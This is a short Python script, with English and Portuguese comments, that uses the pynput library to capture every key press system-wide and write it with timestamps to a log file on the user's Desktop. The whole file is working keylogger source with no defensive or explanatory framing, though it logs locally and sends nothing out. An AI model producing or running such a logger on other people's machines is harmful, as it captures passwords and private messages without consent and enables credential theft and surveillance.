import logging
import os

from pynput.keyboard import Listener

username = os.getlogin()

# Where log file is stored: // Onde o arquivo de log é guardado:
# If in windows use "C:/..." // No windows usar "C:/.."
logging_directory = f"/home/{username}/Desktop"

logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")


def key_handler(key):
    logging.info(key)


with Listener(on_press=key_handler) as listener:
    listener.join()
